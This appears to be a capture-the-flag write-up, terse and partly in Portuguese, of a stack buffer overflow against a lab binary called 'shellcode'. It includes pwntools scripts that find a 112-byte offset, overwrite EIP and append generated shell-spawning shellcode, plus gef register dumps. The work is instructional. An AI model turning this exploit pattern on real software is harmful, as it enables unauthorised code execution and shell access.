# Shellcode



Na opçao 2 do menu era disponibilizado o endereço : 0xffa62bdc (ou 0xffd0eccc) que nao me lembro bem



cyclic 200

ver onde partia

-> offset dava 112



```python
from pwn import *

# Offset to overwrite EIP
offset = 112  # Replace with the calculated offset

# Target address (e.g., writable memory or shellcode location)
target_address = 0xffa62bdc  # Replace with the desired address

# Construct the payload
payload = b"A" * offset        # Padding to reach EIP
payload += p32(target_address) # Overwrite EIP with target address

# Save the payload
with open("payload.txt", "wb") as f:
    f.write("1\n".encode())
    f.write(payload)

print("Payload written to payload.txt")
```

```
run < payload.txt
```

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

we got 0xffa62bdc



```
gef➤  info registers 

eax            0x13                0x13
ecx            0x13                0x13
edx            0x0                 0x0
ebx            0xf7f9b000          0xf7f9b000
esp            0xffffce20          0xffffce20
ebp            0x41414141          0x41414141
esi            0xffffcf24          0xffffcf24
edi            0xf7ffcb80          0xf7ffcb80
eip            0xffa62bdc          0xffa62bdc
eflags         0x10282             [ SF IF RF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63

```

```
info proc mappings
```



<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



```python
from pwn import *

# Offset to overwrite EIP
offset = 112  # Replace with the correct offset for this binary

# Address in the stack to jump to (update based on your `gef➤ x/40x $esp` output)
shellcode_address = 0xffffce20  # Adjust based on your findings

# Generate shellcode (execve "/bin/bash" example)
shellcode = asm(shellcraft.sh())  # Generates shellcode for spawning a shell

# Construct the payload
payload = b"A" * offset               # Padding to reach EIP
payload += p32(shellcode_address)     # Overwrite EIP with shellcode address
payload += shellcode                  # Append the shellcode

# Save the payload to a file
with open("payload.txt", "wb") as f:
    f.write("1\n".encode())           # Input selection for the binary's menu
    f.write(payload)

print(f"Payload written to payload.txt (size: {len(payload)})")
```

```
./shellcode < payload.txt | socat -,raw,echo=0
```

